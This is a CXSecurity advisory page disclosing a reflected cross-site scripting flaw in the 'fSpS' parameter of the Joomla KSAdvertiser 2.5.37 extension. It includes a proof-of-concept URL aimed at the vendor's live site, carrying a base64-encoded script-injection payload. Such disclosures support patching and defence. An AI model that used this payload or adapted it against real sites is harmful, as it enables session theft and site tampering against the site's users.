---
title: Joomla KSAdvertiser 2.5.37 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2022100035
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-14
fetch_date: 2025-10-03T19:47:47.974767
---

# Joomla KSAdvertiser 2.5.37 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Joomla KSAdvertiser 2.5.37 Cross Site Scripting** **2022.10.13**  Credit:  **[CraCkEr](https://cxsecurity.com/author/CraCkEr/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

┌┌───────────────────────────────────────────────────────────────────────────────────────┐
││ C r a C k E r ┌┘
┌┘ T H E C R A C K O F E T E R N A L M I G H T ││
└───────────────────────────────────────────────────────────────────────────────────────┘┘
┌──── From The Ashes and Dust Rises An Unimaginable crack.... ────┐
┌┌───────────────────────────────────────────────────────────────────────────────────────┐
┌┘ [ Exploits ] ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
: Author : CraCkEr :
│ Website : extensions.joomla.org │
│ Vendor : Heiner Klostermann - kiss-software.de │
│ Software : Joomla KSAdvertiser 2.5.37 │
│ Vuln Type: Reflected XSS │
│ Method : GET │
│ Impact : Manipulate the content of the site │
│ │
│────────────────────────────────────────────────────────────────────────────────────────│
│ B4nks-NET irc.b4nks.tk #unix ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
: :
│ Release Notes: │
│ ═════════════ │
│ The attacker can send to victim a link containing a malicious URL in an email or │
│ instant message can perform a wide variety of actions, such as stealing the victim's │
│ session token or login credentials │
│ │
┌┌───────────────────────────────────────────────────────────────────────────────────────┐
┌┘ ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
Greets:
The\_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL
CryptoJob (Twitter) twitter.com/CryptozJob
┌┌───────────────────────────────────────────────────────────────────────────────────────┐
┌┘ © CraCkEr 2022 ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
Path: /index.php
GET parameter 'fSpS' is vulnerable to XSS
https://www.kiss-software.de/index.php?option=com\_ksadvertiser&view=items&Itemid=0&filtercat=50&fSpS=KGNjLmlkID0gNTAgT1IgY2MucGFyZW50X2lkID0gNTApfChhLml0X2lkZW50PScxJyBPUiBhLml0X3Bob25ldGljIExJS0UgJyUxJScpfChhLnRpdGxlPScyJyBPUiBhLml0X3Bob25ldGljIExJS0UgJyUyJScpfChhLml0X2ludHJvPSczJyBPUiBhLml0X3Bob25ldGljIExJS0UgJyUzJScpfCgoYS5pdF9hZGRyZXNzPSc0JyBPUiBhLml0X3Bob25ldGljIExJS0UgJyU0JScpIEFORCBhLml0X2JveG51bWJlciA9IDApfCgoYS5pdF9wb3N0Y29kZT0nNScgT1IgYS5pdF9waG9uZXRpYyBMSUtFICclNSUnKSBBTkQgYS5pdF9ib3hudW1iZXIgPSAwKXwoKGEuaXRfY2l0eT0nNicgT1IgYS5pdF9waG9uZXRpYyBMSUtFICclNiUnKSBBTkQgYS5pdF9ib3hudW1iZXIgPSAwKWg1bjZsPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PmlyYzdu&lang=en
[-] Done

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100035)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top